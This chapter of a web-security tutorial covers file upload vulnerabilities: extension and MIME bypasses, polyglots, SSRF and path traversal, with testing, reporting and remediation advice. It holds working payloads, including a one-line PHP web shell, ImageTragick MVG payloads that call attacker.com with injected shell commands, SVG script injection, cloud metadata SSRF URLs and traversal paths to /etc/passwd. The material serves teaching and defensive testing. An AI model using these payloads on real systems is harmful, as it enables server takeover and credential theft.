# Chapter 25 – File Upload Vulnerabilities & Advanced Payloads

## Mental Model
File upload features are dangerous because the server must:
- Accept untrusted files  
- Validate them  
- Store them  
- Sometimes parse or transform them  

If any step is weak, attackers can achieve:
- Remote Code Execution  
- Stored XSS  
- SSRF  
- Privilege escalation  
- Full server takeover  

---

# Types of File Upload Vulnerabilities

## 1. **Unrestricted File Upload**
Attacker uploads arbitrary files, leading to:
- Web shell  
- Script execution  
- Malware storage  
- Log poisoning → RCE  

Example payloads:
- `shell.php`
- `shell.jsp`
- `shell.asmx`
- `payload.svg` containing JS  
- `reverse_shell.php.jpeg` (double extension)

If the server stores files in a web-accessible folder, this becomes critical.

---

## 2. **MIME-Type Bypass**
Server only checks `Content-Type` header:

Content-Type: image/png


Attacker simply fakes it:


Content-Type: image/png

But uploads a PHP file → server trusts it.

---

## 3. **Extension Bypass**
Filters that only check `.jpg` or `.png` can be bypassed.

Techniques:
- **Double Extensions:** `shell.php.jpg`
- **Null Byte Injection:** `shell.php%00.jpg`
- **Uppercase Extensions:** `SHELL.PHP`
- **Unicode Extensions:** `shell.pHp`
- **Tricky formats:** polyglot files (valid image + valid script)

---

## 4. **Content Sniffing / Polyglot Files**
Chrome, Safari, and Edge may treat a file as:
- **HTML**  
- **SVG**  
- **JS**  
- **JSON**  

Even if server labels it as an image.

Common polyglots:
- **SVG with JS** → stored XSS  
- **PDF with JS**  
- **GIF89a** headers inside scripts  

Example malicious SVG:

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>


If profile pictures display raw SVG → stored XSS.

5. ImageTragick (CVE-2016-3714) – REAL RCE

ImageMagick allowed shell execution by processing images containing special payloads.

Exploit:

push graphic-context
viewbox 0 0 640 480
fill 'url(https://attacker.com"|ls -la|")'
pop graphic-context


If server does:

Thumbnail generation

Image conversion

Image resizing

And uses a vulnerable ImageMagick policy → remote command execution.

6. Upload → SSRF

If server fetches additional metadata for images, you can embed URLs inside:

EXIF

SVG

EPS

PDF

Examples:

EXIF field containing http://169.254.169.254/latest/meta-data/

SVG importing URL:

<image href="http://internal-api/admin" />

7. Upload → Path Traversal

If filenames are used unsafely:

../../../var/www/html/shell.php


Or:

../../../../../../etc/passwd


Some systems allow overwriting config files.

8. File Overwrite / File Replace Bugs

Attackers overwrite:

Session files

Logs

Scripts

.env files

Impact: privilege escalation → full system compromise.

How to Test File Uploads
1. Try Dangerous Extensions

Upload files named:

shell.php
shell.php.jpg
test.svg
test.html
evil.jsp

2. Try Inspecting the Upload Folder

Sometimes response reveals paths:

/uploads/profile/12345.png


Try manual browsing:

https://target.com/uploads/

3. Break Client-Side Validation

Disable JavaScript:

Using Burp

Using Firefox dev tools

Sending requests manually

Client-side filters mean nothing.

4. Build Polyglot Payloads

Test files like:

svg with JS

GIF89a header + HTML

Real PNG with appended payload

5. ImageTragick Test Payload

Upload .mvg or .svg containing:

push graphic-context
fill 'url(https://attacker.com"|id|")'
pop graphic-context


If ImageMagick processes it → RCE.

6. Fuzz Filename Normalization

Examples:

evil.php%00.png
evil.php::$DATA
evil.php;;;;;.jpg
evil.pHp

7. Check Storage Location

If uploaded files go to:

/var/www/html/uploads/


→ Executable scripts → critical.

If they go to:

AWS S3
GCP bucket
Azure blob


still dangerous (XSS, phishing, SSRF).

Real Attack Examples (Generalized)
1. Full Webshell Upload

Attacker uploads PHP shell:

<?php system($_GET['cmd']); ?>


Then executes:

shell.php?cmd=whoami

2. Stored XSS via SVG

Profile picture uses unsafe SVG → triggers JS on admin panel.

3. PDF Processing RCE

PDF processed by Ghostscript → attacker gets shell.

4. ImageTragick RCE

Image conversion triggers remote command execution.

5. SSRF via EXIF

Attacker injects metadata:

http://169.254.169.254/latest/meta-data/

6. Path Traversal Overwrite

Uploaded file overwrites:

/var/www/html/app/config.php

High-Value Targets

Look closely at features involving:

Profile pictures

Document uploads

Invoice/receipt uploads

Image thumbnails

Avatar transformations

Social media link previews

PDF generation

OCR services

AI image processors

Any file imported from user input

Automation Ideas

File extension fuzzer

MIME-type fuzzer

Polyglot generator

EXIF injection tool

ImageTragick payload generator

Race-condition upload overwrite tester

Reporting Tips

Include:

Vulnerable upload endpoint

Type of bypass (extension, MIME, polyglot, etc.)

Proof of exploitation

Storage location and path

Execution vector (webshell, XSS, SSRF)

Full impact analysis

Remediation

Validate extension AND MIME type AND file signature

Use allow-list ONLY

Strip active content from images

Disable SVG uploads

Process images in sandbox

Never use user-controlled filenames

Never store uploads in webroot

Apply ImageMagick security policy

Limit file size & file count

Remove metadata (EXIF sanitization)
